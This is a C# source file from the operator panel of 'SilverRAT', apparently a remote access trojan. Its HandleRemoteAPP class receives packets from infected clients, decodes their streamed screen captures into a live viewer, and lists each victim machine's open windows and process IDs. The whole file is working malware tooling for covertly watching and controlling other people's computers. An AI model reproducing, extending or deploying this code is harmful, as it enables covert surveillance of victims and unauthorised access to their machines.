using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleRemoteAPP
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "ClearUnsafeCode":
                    {
                        RemoteApp remoteApp2 = (RemoteApp)Application.OpenForms["RAPP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (remoteApp2 != null)
                            {
                                remoteApp2.decoder = new UnsafeStreamCodec(Convert.ToInt32(remoteApp2.QualityTrackBar.Value));
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "Capture":
                    {
                        RemoteApp remoteApp3 = (RemoteApp)Application.OpenForms["RAPP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteApp3 != null)
                        {
                            byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            lock (remoteApp3.syncPicbox)
                            {
                                using (MemoryStream inStream = new MemoryStream(asBytes))
                                {
                                    Bitmap bitmap = (Bitmap)(remoteApp3.GetImage = remoteApp3.decoder.DecodeData(inStream));
                                    remoteApp3.rdSize = bitmap.Size;
                                    if (!remoteApp3.Speed.Checked)
                                    {
                                        remoteApp3.decoder = new UnsafeStreamCodec(Convert.ToInt32(remoteApp3.QualityTrackBar.Value));
                                    }
                                }
                                remoteApp3.ViewerBox.Image = remoteApp3.GetImage;
                                remoteApp3.FPS++;
                                if (remoteApp3.sw.ElapsedMilliseconds >= 1000L)
                                {
                                    BunifuLabel logs = remoteApp3.logs;
                                    int fPS = remoteApp3.FPS;
                                    logs.Text = "FPS: " + fPS + " | Size: " + Methods.BytesToString(asBytes.Length);
                                    remoteApp3.SizeScreen.Text = remoteApp3.ViewerBox.Image.Width + ":" + remoteApp3.ViewerBox.Image.Height;
                                    remoteApp3.FPS = 0;
                                    remoteApp3.sw = Stopwatch.StartNew();
                                }
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Stop":
                    {
                        RemoteApp remoteApp4 = (RemoteApp)Application.OpenForms["RAPP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteApp4 != null)
                        {
                            remoteApp4.Power.Enabled = true;
                            remoteApp4.Power.Text = "Start";
                            remoteApp4.logs.Text = "";
                            try
                            {
                                if (remoteApp4.decoder != null)
                                {
                                    remoteApp4.decoder = new UnsafeStreamCodec(remoteApp4.QualityTrackBar.Value);
                                }
                                if (remoteApp4.ViewerBox.Image != null)
                                {
                                    remoteApp4.ViewerBox.Image = null;
                                }
                                break;
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Start":
                    {
                        RemoteApp remoteApp6 = (RemoteApp)Application.OpenForms["RAPP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteApp6 != null)
                        {
                            remoteApp6.Power.Enabled = true;
                            remoteApp6.Power.Text = "Stop";
                            Program.Silver.TransitionHiddeng.HideSync(remoteApp6.PanelMune);
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "WindowsActive":
                    {
                        RemoteApp remoteApp5 = (RemoteApp)Application.OpenForms["RAPP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteApp5 != null)
                        {
                            remoteApp5.ListWindows.Rows.Clear();
                            string asString = unpack_msgpack.ForcePathObject("List").AsString;
                            string[] array = asString.Split(new string[1] { "-==>" }, StringSplitOptions.None);
                            int num;
                            for (num = 0; num <= array.Length - 1; num++)
                            {
                                if (array[num].Length > 0)
                                {
                                    string name = array[num];
                                    string pID = array[num + 1];
                                    Image icon = Image.FromStream(new MemoryStream(Convert.FromBase64String(array[num + 2])));
                                    AddToListProcess(unpack_msgpack.ForcePathObject("ID").AsString, remoteApp5.ListWindows, icon, name, pID);
                                }
                                num += 2;
                            }
                            remoteApp5.CountWindows.Text = "Active : " + remoteApp5.ListWindows.RowCount;
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        RemoteApp remoteApp = (RemoteApp)Application.OpenForms["RAPP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteApp != null)
                        {
                            if (remoteApp.Client == null)
                            {
                                remoteApp.Client = client;
                                remoteApp.LoaderConnect.Visible = false;
                                remoteApp.Timer1.Start();
                                remoteApp.Power.Enabled = true;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }

    public void AddToListProcess(string IDForm, Guna2DataGridView DGV, Image Icon, string name, string PID)
    {
        try
        {
            RemoteApp RAPP = (RemoteApp)Application.OpenForms["RAPP:" + IDForm];
            if (RAPP == null || RAPP.Client == null)
            {
                return;
            }
            DataGridViewRow item = new DataGridViewRow
            {
                Height = 24
            };
            item.Cells.Add(new DataGridViewImageCell
            {
                Value = Icon,
                ImageLayout = DataGridViewImageCellLayout.Zoom
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = name
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = PID
            });
            if (RAPP.InvokeRequired)
            {
                RAPP.Invoke((MethodInvoker)delegate
                {
                    lock (RAPP.syncList)
                    {
                        DGV.Rows.Insert(0, item);
                    }
                });
                return;
            }
            lock (RAPP.syncList)
            {
                DGV.Rows.Insert(0, item);
            }
        }
        catch
        {
        }
    }
}
